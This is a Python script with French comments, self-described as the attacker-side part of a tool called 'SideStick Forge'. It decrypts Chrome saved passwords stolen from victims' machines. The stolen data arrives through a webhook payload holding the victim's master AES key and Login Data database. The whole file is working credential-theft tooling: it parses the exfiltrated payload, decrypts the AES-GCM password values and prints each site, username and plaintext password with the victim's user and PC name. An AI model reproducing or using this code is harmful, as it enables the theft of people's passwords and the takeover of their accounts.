#!/usr/bin/env python3
"""
SideStick Forge — Chrome password decryptor (attacker side)
Décrypte les données envoyées par le mode A-06 via webhook.

Format du payload webhook (JSON) :
  { "t": "chrome",
    "mk": "<base64 clé AES master — 32 bytes après DPAPI.Unprotect>",
    "db": "<base64 Login Data SQLite>",
    "pc": "DESKTOP-XXXX",
    "u":  "username" }

Les mots de passe Chrome 80+ sont AES-256-GCM :
  encrypted_value = b'v10' + nonce(12) + ciphertext+tag

Requirements:
  pip install cryptography

Usage:
  python decrypt_chrome.py payload.json
  cat webhook_data.json | python decrypt_chrome.py -
"""

import base64
import json
import os
import sqlite3
import sys
import tempfile

try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
except ImportError:
    print("[!] Module manquant : pip install cryptography")
    sys.exit(1)


def decrypt_password(master_key: bytes, encrypted_value: bytes) -> str:
    if not encrypted_value:
        return "(vide)"
    if len(encrypted_value) < 3:
        return "[trop court]"
    if encrypted_value[:3] != b"v10":
        return "[format legacy DPAPI — déchiffrement local requis]"
    nonce   = encrypted_value[3:15]    # 12 bytes
    payload = encrypted_value[15:]     # ciphertext + 16-byte auth tag
    try:
        return AESGCM(master_key).decrypt(nonce, payload, None).decode("utf-8", errors="replace")
    except Exception as e:
        return f"[erreur AES-GCM: {e}]"


def process(raw: str) -> None:
    try:
        data = json.loads(raw)
    except json.JSONDecodeError as e:
        print(f"[!] JSON invalide : {e}")
        sys.exit(1)

    pc         = data.get("pc", "inconnu")
    user       = data.get("u",  "inconnu")
    master_key = base64.b64decode(data["mk"])
    db_bytes   = base64.b64decode(data["db"])

    print()
    print("=" * 70)
    print(f"  Cible    : {user}@{pc}")
    print(f"  Clé AES  : {master_key.hex()[:32]}…  ({len(master_key)} bytes)")
    print("=" * 70)

    with tempfile.NamedTemporaryFile(suffix=".db", delete=False) as f:
        f.write(db_bytes)
        tmppath = f.name

    try:
        conn = sqlite3.connect(tmppath)
        rows = conn.execute(
            "SELECT origin_url, username_value, password_value "
            "FROM logins ORDER BY origin_url"
        ).fetchall()
        conn.close()
    except sqlite3.DatabaseError as e:
        print(f"[!] SQLite : {e}")
        os.unlink(tmppath)
        return
    finally:
        try:
            os.unlink(tmppath)
        except OSError:
            pass

    if not rows:
        print("  (base de données vide)")
        return

    col_url = 55
    col_usr = 30
    print(f"\n  {'URL':<{col_url}}  {'Username':<{col_usr}}  Password")
    print("  " + "-" * (col_url + col_usr + 40))

    found = 0
    for url, username, enc_pw in rows:
        pw = decrypt_password(master_key, enc_pw)
        if not username and not pw:
            continue
        print(f"  {url[:col_url]:<{col_url}}  {username[:col_usr]:<{col_usr}}  {pw}")
        found += 1

    print(f"\n  {found} credential(s) extrait(s) sur {len(rows)} entrée(s).")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(__doc__)
        sys.exit(1)

    if sys.argv[1] == "-":
        raw = sys.stdin.read()
    else:
        with open(sys.argv[1], "r", encoding="utf-8") as f:
            raw = f.read()

    process(raw)
